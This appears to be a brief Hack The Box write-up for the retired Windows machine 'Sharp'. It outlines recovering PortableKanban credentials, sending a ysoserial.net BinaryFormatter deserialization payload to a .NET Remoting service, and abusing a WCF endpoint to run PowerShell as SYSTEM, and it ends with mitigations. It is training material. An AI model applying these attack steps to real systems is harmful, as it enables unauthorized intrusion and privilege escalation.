---
machine: Sharp
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, portablekanban, dotnet-remoting, wcf, ysoserial]
---

# Sharp — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

PortableKanban stores decryptable credentials and provides the first access. A .NET Remoting service accepts a serialized payload with `ysoserial.net` and yields a user shell. Reversing a WCF service reveals an endpoint running PowerShell and reaches SYSTEM.

## Reconnaissance

```bash
nmap -Pn -sCV -p135,139,445,5985 <IP>
# PortableKanban
PortableKanban.exe
# .NET Remoting
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o raw > payload.bin
python3 remoting_client.py <IP> payload.bin
# WCF
dnSpy.exe <SERVICE>.exe
# Administrative endpoint
powershell -c "Invoke-Command -ComputerName <HOST> -ScriptBlock { whoami }"
```

## Enumeration

- PortableKanban with its configuration and local database.
- Exposed .NET Remoting with a binary formatter.
- WCF service with an administrative endpoint.

## Initial access

Locate the PortableKanban configuration or database and recover the stored password. With those credentials, access the host and enumerate the .NET Remoting service.

## Privilege escalation

Generate a `BinaryFormatter` payload with `ysoserial.net` and send it to the remote channel, obtaining execution as the service user. Decompile the WCF service with dnSpy, identify the endpoint launching PowerShell and use it to run as SYSTEM.

## Evidence

- Decrypted PortableKanban password.
- ysoserial payload accepted and user shell.
- WCF endpoint invoked with PowerShell as SYSTEM.

## Lessons learned

- Desktop applications store recoverable secrets.
- .NET Remoting with BinaryFormatter is unsafe deserialization.
- WCF administration endpoints need authentication and restrictions.

## Mitigation and detection

- Do not store recoverable passwords; rotate them.
- Remove .NET Remoting or migrate to secure channels.
- Restrict WCF and run services with low-privilege accounts.

## References

- [0xdf — Sharp](https://0xdf.gitlab.io/2021/05/01/htb-sharp.html)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [Hack The Box — Sharp](https://app.hackthebox.com/machines/sharp)
